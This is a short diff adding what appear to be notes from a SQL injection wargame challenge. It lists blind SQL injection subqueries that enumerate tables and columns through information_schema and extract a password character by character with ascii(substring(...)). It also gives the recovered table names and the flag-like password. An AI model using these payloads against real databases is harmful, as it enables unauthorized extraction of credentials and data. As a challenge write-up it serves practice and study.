@@ -1,0 +1,17 @@
+(select count(table_name) from information_schema.tables where table_schema=database())
+2
+
+(select length(table_name) from information_schema.tables where table_schema=database() limit 1)
+13
+
+(select ascii(substring(table_name, 1, 1)) from information_schema.tables where table_schema=database() limit 1)
+97 100 109 105 110 95 97 114 101 97 95 112 119 [admin_area_pw - 1]
+108 111 103 [log - 2]
+
+
+(select length(column_name) from information_schema.columns where table_name = 'admin_area_pw')
+
+(select length(pw) from admin_area_pw limit 1)
+
+(select ascii(substring(pw, 1, 1)) from admin_area_pw)
+kudos_to_beistlab
